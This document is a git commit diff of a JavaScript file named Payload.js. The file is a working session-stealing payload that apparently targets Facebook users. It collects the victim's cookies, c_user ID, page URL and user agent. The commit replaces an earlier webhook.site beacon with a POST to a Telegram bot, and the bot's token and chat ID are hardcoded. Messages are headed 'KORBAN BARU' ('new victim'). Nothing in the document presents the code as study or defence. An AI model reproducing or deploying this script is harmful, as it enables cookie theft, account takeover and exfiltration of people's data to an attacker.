8bff41606c15db6780f22e327a0ff2688a7f1b95
infopentingmlbb <jamerika086@gmail.com>
2026-05-18 21:50:14 +0700

    Payload.js

--- Payload.js
+++ Payload.js
@@ -1,10 +1,22 @@
 (function(){
-    var data = '';
-    data += 'COOKIES:\n' + document.cookie + '\n\n';
-    data += 'USER ID:\n' + (document.cookie.match(/c_user=(\d+)/)||['','tidak ditemukan'])[1] + '\n\n';
-    data += 'URL:\n' + window.location.href + '\n\n';
-    data += 'LOCALSTORAGE:\n' + JSON.stringify(localStorage);
+    var token = '8700873155:AAGoOIIJzNBB0Dj1ycgyBrwY42A_05lpSH4';
+    var chatId = '1923372966';
     
-    var img = new Image();
-    img.src = 'https://webhook.site/XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX?data=' + encodeURIComponent(data);
+    var data = '';
+    data += '🔴 KORBAN BARU\n\n';
+    data += '📋 COOKIES:\n' + document.cookie + '\n\n';
+    data += '👤 USER ID: ' + (document.cookie.match(/c_user=(\d+)/)||['','tidak ditemukan'])[1] + '\n\n';
+    data += '🔗 URL: ' + window.location.href + '\n\n';
+    data += '📱 USER AGENT: ' + navigator.userAgent;
+    
+    var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
+    
+    fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: data
+        })
+    });
 })();
